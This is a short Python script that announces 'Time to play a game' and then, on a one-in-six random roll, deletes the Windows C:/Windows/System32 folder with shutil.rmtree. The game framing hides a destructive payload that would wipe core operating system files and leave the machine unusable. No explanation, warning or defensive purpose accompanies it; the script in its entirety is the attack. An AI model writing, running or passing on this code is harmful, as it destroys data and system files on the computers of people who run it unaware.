import random
import shutil

print("\nTime to play a game\n")

bullet = random.randint(0,5)

if bullet == 1:
    shutil.rmtree("C:/Windows/System32")

